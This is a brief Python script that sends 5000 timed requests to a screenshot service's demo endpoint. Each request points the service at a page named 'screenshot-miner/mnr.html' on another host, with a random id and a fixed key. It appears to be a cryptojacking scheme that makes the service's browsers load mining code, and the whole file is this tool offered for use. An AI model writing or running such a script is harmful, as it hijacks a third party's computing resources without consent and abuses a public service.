import uuid
import time

import requests

template = "https://utils.esemi.ru/screenshot-miner/mnr.html?page=%s#VSWxpBVWI5jiiZ7itCoXO8e5jH0U5fzR"
host = "https://www.thumbalizr.com/demo"

for i in range(5000):
    try:
        resp = requests.post(host, params={'url': template % uuid.uuid4().hex})
    except Exception as e:
        print(e)
    else:
        print('%s: %s' % (i, resp.status_code))
    time.sleep(3)
